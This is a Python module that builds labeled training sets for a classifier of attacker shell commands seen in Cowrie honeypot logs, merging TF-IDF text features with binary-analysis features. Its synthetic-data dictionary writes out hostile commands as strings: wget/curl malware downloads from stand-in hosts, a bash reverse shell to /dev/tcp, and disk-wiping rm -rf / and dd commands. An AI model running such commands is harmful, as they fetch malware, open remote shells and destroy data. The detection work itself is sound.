import json
import numpy as np
import os
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer
from scipy.sparse import hstack, csr_matrix


# ===================================================================
# Label mapping (shared by both old and enriched pipelines)
# ===================================================================

LABEL_MAP = {
    "Benign": 0,
    "Reconnaissance": 1,
    "Malware_Download": 2,
    "Stager/Dropper": 2,
    "Exploit_Attempt": 3,
    "Ransomware/Encryption": 4,
    "Data_Destruction": 4,
    "Advanced_APT_Malware": 5,
    "Logic_Bomb_Detonated": 5,
    "Obfuscated_Go_Binary": 5,
}

# Maps binary triage primary_label -> training label ID
# This is the key bridge: binary behavior -> ML class
BINARY_LABEL_TO_CLASS = {
    "miner": 2,                # Malware_Download
    "botnet_dropper": 2,       # Malware_Download (dropper behavior)
    "downloader": 2,           # Malware_Download
    "credential_stealer": 3,   # Exploit_Attempt (credential theft)
    "rat": 3,                  # Exploit_Attempt (remote access)
    "recon_scanner": 1,        # Reconnaissance
    "destructive": 4,          # Data_Destruction
    "packed_unknown": 3,       # Exploit_Attempt (suspicious, packed)
    "worm": 3,                 # Exploit_Attempt (self-propagating)
}

SYNTHETIC_DATA = {
    0: ["ls -la", "git status", "cd /var/www", "whoami", "pwd", "systemctl status nginx"],
    1: ["nmap -sV 127.0.0.1", "masscan 0.0.0.0/0", "zmap -p 80", "netstat -an"],
    2: ["wget http://evil.com/bot", "curl -O http://1.2.3.4/rat", "scp user@bad.com:/tmp/x ."],
    3: ["./exploit_cve_2024", "python3 exploit.py target", "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"],
    4: ["rm -rf / --no-preserve-root", "dd if=/dev/zero of=/dev/sda", "openssl enc -aes-256-cbc"],
    5: ["./payload.bin Activate_Zorya_Protocol", "go run logic_bomb.go --silent", "chmod +x /tmp/svc; /tmp/svc --hide"],
}


# ===================================================================
# Original dataset builder (preserved for backward compatibility)
# ===================================================================

def build_dataset(
    fusion_file,
    cowrie_file,
    output_dir,
    max_log_lines=150000,
    synthetic_multiplier=500,
):
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    ip_capability = {}
    if os.path.exists(fusion_file):
        with open(fusion_file, 'r') as f:
            data = json.load(f)
            for record in data:
                ip = record.get('session_ip')
                intent = record.get('inferred_intent')
                caps = record.get('capabilities', [])
                label = LABEL_MAP.get(intent, 0)
                if "Obfuscated_Go_Binary" in caps or "Advanced_APT_Malware" in caps:
                    label = 5
                if label > 0:
                    ip_capability[ip] = label

    corpus = []
    labels = []

    if os.path.exists(cowrie_file):
        with open(cowrie_file, 'r') as f:
            for i, line in enumerate(f):
                if i > max_log_lines:
                    break
                try:
                    entry = json.loads(line)
                    if entry.get('eventid') == 'cowrie.command.input':
                        cmd = entry.get('input')
                        ip = entry.get('src_ip')
                        label = ip_capability.get(ip, 0)
                        if cmd:
                            corpus.append(cmd)
                            labels.append(label)
                except Exception:
                    continue

    for label_id, commands in SYNTHETIC_DATA.items():
        for _ in range(synthetic_multiplier):
            for cmd in commands:
                corpus.append(cmd)
                labels.append(label_id)

    vectorizer = TfidfVectorizer(max_features=3000, analyzer='char_wb', ngram_range=(2, 5))
    X = vectorizer.fit_transform(corpus)
    y = np.array(labels)

    with open(os.path.join(output_dir, "X_deep_sparse.pkl"), 'wb') as f:
        pickle.dump(X, f)
    with open(os.path.join(output_dir, "y_deep.pkl"), 'wb') as f:
        pickle.dump(y, f)
    with open(os.path.join(output_dir, "vectorizer_deep.pkl"), 'wb') as f:
        pickle.dump(vectorizer, f)

    return {
        "samples": len(y),
        "shape": X.shape,
        "output_dir": output_dir,
    }


# ===================================================================
# Enriched dataset builder (Phase 1 — binary-aware labels)
# ===================================================================

# Boolean binary feature column names (must match the keys in
# session["binary_features"] produced by analysis.enrich_sessions_with_binary_features)
BINARY_FEATURE_COLUMNS = [
    "has_miner",
    "has_botnet",
    "has_downloader",
    "has_destructive",
    "has_recon",
    "has_credential_access",
    "has_rat",
    "has_go_binary",
    "has_packed",
]


def _label_from_binary_features(binary_features):
    """
    Determine a training label for a session based on its aggregated
    binary features.  Uses the strongest signal from downloaded binaries.

    Priority order (highest wins):
      5 - Go binary with multi-capability (APT-like)
      4 - Destructive
      3 - Credential stealer / RAT / packed unknown
      2 - Miner / botnet / downloader
      1 - Recon scanner
      0 - No binary indicators (but session exists)

    Returns (label_id, source_reason) tuple.
    """
    if not binary_features or binary_features.get("num_downloads", 0) == 0:
        return None, "no_downloads"

    labels = binary_features.get("binary_labels", [])
    tags = set(binary_features.get("binary_tags", []))

    # Go binary with multiple capabilities = APT-like (class 5)
    if binary_features.get("has_go_binary") and len(tags) >= 4:
        return 5, "go_binary_multi_capability"

    # Check each category in priority order
    if binary_features.get("has_destructive"):
        return 4, "binary_destructive"
    if binary_features.get("has_credential_access"):
        return 3, "binary_credential_stealer"
    if binary_features.get("has_rat"):
        return 3, "binary_rat"
    if binary_features.get("has_packed"):
        return 3, "binary_packed_suspicious"
    if binary_features.get("has_miner"):
        return 2, "binary_miner"
    if binary_features.get("has_botnet"):
        return 2, "binary_botnet"
    if binary_features.get("has_downloader"):
        return 2, "binary_downloader"
    if binary_features.get("has_recon"):
        return 1, "binary_recon"

    # Has downloads but no strong indicators
    if labels:
        # Use the BINARY_LABEL_TO_CLASS mapping for the best label
        best_class = 0
        for lbl in labels:
            cls = BINARY_LABEL_TO_CLASS.get(lbl, 0)
            best_class = max(best_class, cls)
        if best_class > 0:
            return best_class, f"binary_label_{labels[0]}"

    return None, "unknown_binary_behavior"


def build_enriched_dataset(
    enriched_sessions,
    output_dir,
    synthetic_multiplier=200,
    tfidf_max_features=3000,
):
    """
    Build a training dataset that fuses command-line text features (TF-IDF)
    with binary behavior features from Phase 1 triage.

    This replaces the weak IP-based labeling with strong labels derived
    from actual binary analysis.

    Parameters
    ----------
    enriched_sessions : dict
        Output of analysis.enrich_sessions_with_binary_features().
        Has keys "sessions" and "downloads".
    output_dir : str
        Directory to write output files.
    synthetic_multiplier : int
        How many times to repeat synthetic examples per class.
        Lower than the original (200 vs 500) because we now have real
        labeled data from binary analysis.
    tfidf_max_features : int
        Max TF-IDF features.

    Returns
    -------
    dict
        Statistics about the built dataset.
    """
    os.makedirs(output_dir, exist_ok=True)

    sessions = enriched_sessions.get("sessions", [])

    corpus = []
    labels = []
    binary_feature_rows = []
    label_sources = []  # track where each label came from (for debugging)

    # --- Real session data with binary-enriched labels ---
    labeled_from_binary = 0
    labeled_default = 0

    for session in sessions:
        commands = session.get("commands", [])
        if not commands:
            continue

        # Join all commands in this session into one document
        cmd_text = " ; ".join(commands)

        # Determine label from binary features
        bf = session.get("binary_features")
        label, reason = _label_from_binary_features(bf)

        if label is not None:
            labeled_from_binary += 1
        else:
            # No binary-based label: default to 0 (Benign) since it's
            # a real session without malware indicators
            label = 0
            reason = "no_binary_indicators"
            labeled_default += 1

        corpus.append(cmd_text)
        labels.append(label)
        label_sources.append(reason)

        # Build the binary feature vector for this session
        if bf:
            row = [1.0 if bf.get(col, False) else 0.0 for col in BINARY_FEATURE_COLUMNS]
            # Add num_downloads and max_priority as numeric features
            row.append(float(bf.get("num_downloads", 0)))
            row.append(float(bf.get("max_priority", 0)) / 100.0)  # normalize to 0-1
        else:
            row = [0.0] * (len(BINARY_FEATURE_COLUMNS) + 2)

        binary_feature_rows.append(row)

    real_count = len(corpus)

    # --- Synthetic data (reduced multiplier since we have real labels) ---
    num_binary_cols = len(BINARY_FEATURE_COLUMNS) + 2
    for label_id, commands in SYNTHETIC_DATA.items():
        for _ in range(synthetic_multiplier):
            for cmd in commands:
                corpus.append(cmd)
                labels.append(label_id)
                label_sources.append("synthetic")
                # Synthetic data gets zero binary features
                binary_feature_rows.append([0.0] * num_binary_cols)

    synthetic_count = len(corpus) - real_count

    # --- Build TF-IDF features ---
    vectorizer = TfidfVectorizer(
        max_features=tfidf_max_features,
        analyzer='char_wb',
        ngram_range=(2, 5),
    )
    X_tfidf = vectorizer.fit_transform(corpus)

    # --- Combine TF-IDF with binary features ---
    X_binary = csr_matrix(np.array(binary_feature_rows))
    X_combined = hstack([X_tfidf, X_binary], format="csr")

    y = np.array(labels)

    # --- Save outputs ---
    with open(os.path.join(output_dir, "X_enriched_sparse.pkl"), 'wb') as f:
        pickle.dump(X_combined, f)
    with open(os.path.join(output_dir, "y_enriched.pkl"), 'wb') as f:
        pickle.dump(y, f)
    with open(os.path.join(output_dir, "vectorizer_enriched.pkl"), 'wb') as f:
        pickle.dump(vectorizer, f)
    # Save the feature column names for later interpretation
    # NOTE: Use X_tfidf.shape[1] (actual count), NOT tfidf_max_features (the parameter).
    feature_names = {
        "tfidf_features": X_tfidf.shape[1],
        "binary_feature_columns": BINARY_FEATURE_COLUMNS + ["num_downloads", "max_priority_norm"],
        "total_features": X_combined.shape[1],
    }
    with open(os.path.join(output_dir, "feature_names_enriched.json"), 'w') as f:
        json.dump(feature_names, f, indent=2)

    # --- Label distribution ---
    from collections import Counter
    label_dist = dict(Counter(y.tolist()))
    source_dist = dict(Counter(label_sources))

    stats = {
        "total_samples": len(y),
        "real_sessions": real_count,
        "synthetic_samples": synthetic_count,
        "labeled_from_binary": labeled_from_binary,
        "labeled_default_benign": labeled_default,
        "feature_shape": X_combined.shape,
        "tfidf_features": X_tfidf.shape[1],
        "binary_features": X_binary.shape[1],
        "label_distribution": label_dist,
        "label_source_distribution": source_dist,
        "output_dir": output_dir,
    }

    # Save stats for reference
    with open(os.path.join(output_dir, "enriched_dataset_stats.json"), 'w') as f:
        json.dump(stats, f, indent=2, default=str)

    return stats


# ===================================================================
# Phase 4: Deep dataset builder (all binary analysis features)
# ===================================================================

def build_deep_dataset(
    enriched_sessions,
    output_dir,
    synthetic_multiplier=200,
    tfidf_max_features=3000,
):
    """
    Build a training dataset that fuses command-line TF-IDF features with
    the FULL 79-column deep binary analysis feature vector (Phase 1-3).

    This is the Phase 4 upgrade to build_enriched_dataset(). The key
    difference: instead of 11 boolean/count binary features from Phase 1
    triage alone, we now have 79 features that include:
      - Phase 1 triage: entropy, priority, heuristic scores
      - Phase 2 Ghidra: function count, imports, crypto patterns, strings
      - Phase 3 angr: CFG metrics, syscalls, behavioral flags, complexity
      - Script analysis: dropper/miner detection for shell scripts
      - Derived: cross-source signals (mining consensus, evasion count, etc.)

    Sessions must have been enriched with enrich_sessions_with_deep_features()
    which adds the "deep_feature_vector" field.

    Parameters
    ----------
    enriched_sessions : dict
        Output of analysis.enrich_sessions_with_deep_features().
    output_dir : str
        Directory to write output files.
    synthetic_multiplier : int
        How many times to repeat synthetic examples per class.
    tfidf_max_features : int
        Max TF-IDF features.

    Returns
    -------
    dict
        Statistics about the built dataset.
    """
    from core.malware.feature_merger import DEEP_FEATURE_COLUMNS

    os.makedirs(output_dir, exist_ok=True)

    sessions = enriched_sessions.get("sessions", [])
    n_deep = len(DEEP_FEATURE_COLUMNS)

    corpus = []
    labels = []
    deep_feature_rows = []
    label_sources = []

    # --- Real session data ---
    labeled_from_binary = 0
    labeled_default = 0

    for session in sessions:
        commands = session.get("commands", [])
        if not commands:
            continue

        cmd_text = " ; ".join(commands)

        # Use the same labeling logic from Phase 1 (binary_features still present)
        bf = session.get("binary_features")
        label, reason = _label_from_binary_features(bf)

        if label is not None:
            labeled_from_binary += 1
        else:
            label = 0
            reason = "no_binary_indicators"
            labeled_default += 1

        corpus.append(cmd_text)
        labels.append(label)
        label_sources.append(reason)

        # Use the deep feature vector (79 columns)
        deep_vec = session.get("deep_feature_vector")
        if deep_vec and len(deep_vec) == n_deep:
            deep_feature_rows.append(deep_vec)
        else:
            deep_feature_rows.append([0.0] * n_deep)

    real_count = len(corpus)

    # --- Synthetic data ---
    for label_id, commands in SYNTHETIC_DATA.items():
        for _ in range(synthetic_multiplier):
            for cmd in commands:
                corpus.append(cmd)
                labels.append(label_id)
                label_sources.append("synthetic")
                deep_feature_rows.append([0.0] * n_deep)

    synthetic_count = len(corpus) - real_count

    # --- Build TF-IDF ---
    vectorizer = TfidfVectorizer(
        max_features=tfidf_max_features,
        analyzer='char_wb',
        ngram_range=(2, 5),
    )
    X_tfidf = vectorizer.fit_transform(corpus)

    # --- Normalize deep features ---
    # Some features have very different scales (file_size in MB vs boolean 0/1).
    # We do per-column min-max normalization to [0, 1] so tree models can
    # split effectively and features don't dominate by magnitude alone.
    deep_array = np.array(deep_feature_rows, dtype=np.float64)

    # Compute column-wise min/max for normalization
    col_min = deep_array.min(axis=0)
    col_max = deep_array.max(axis=0)
    col_range = col_max - col_min
    # Avoid division by zero: columns with no variation get 0
    col_range[col_range == 0] = 1.0
    deep_normalized = (deep_array - col_min) / col_range

    # Save normalization params for inference
    norm_params = {
        "columns": DEEP_FEATURE_COLUMNS,
        "min": col_min.tolist(),
        "max": col_max.tolist(),
    }
    with open(os.path.join(output_dir, "deep_normalization_params.json"), 'w') as f:
        json.dump(norm_params, f, indent=2)

    X_deep = csr_matrix(deep_normalized)

    # --- Combine ---
    X_combined = hstack([X_tfidf, X_deep], format="csr")
    y = np.array(labels)

    # --- Save outputs ---
    with open(os.path.join(output_dir, "X_deep_v4_sparse.pkl"), 'wb') as f:
        pickle.dump(X_combined, f)
    with open(os.path.join(output_dir, "y_deep_v4.pkl"), 'wb') as f:
        pickle.dump(y, f)
    with open(os.path.join(output_dir, "vectorizer_deep_v4.pkl"), 'wb') as f:
        pickle.dump(vectorizer, f)

    # Feature names for interpretation
    # NOTE: Use X_tfidf.shape[1] (actual count), NOT tfidf_max_features (the parameter).
    # The actual count can be less if the corpus vocabulary is smaller than max_features.
    feature_names = {
        "tfidf_features": X_tfidf.shape[1],
        "deep_feature_columns": DEEP_FEATURE_COLUMNS,
        "total_features": X_combined.shape[1],
    }
    with open(os.path.join(output_dir, "feature_names_deep_v4.json"), 'w') as f:
        json.dump(feature_names, f, indent=2)

    # --- Label distribution ---
    from collections import Counter
    label_dist = dict(Counter(y.tolist()))
    source_dist = dict(Counter(label_sources))

    stats = {
        "total_samples": len(y),
        "real_sessions": real_count,
        "synthetic_samples": synthetic_count,
        "labeled_from_binary": labeled_from_binary,
        "labeled_default_benign": labeled_default,
        "feature_shape": X_combined.shape,
        "tfidf_features": X_tfidf.shape[1],
        "deep_features": n_deep,
        "label_distribution": label_dist,
        "label_source_distribution": source_dist,
        "output_dir": output_dir,
    }

    with open(os.path.join(output_dir, "deep_v4_dataset_stats.json"), 'w') as f:
        json.dump(stats, f, indent=2, default=str)

    return stats
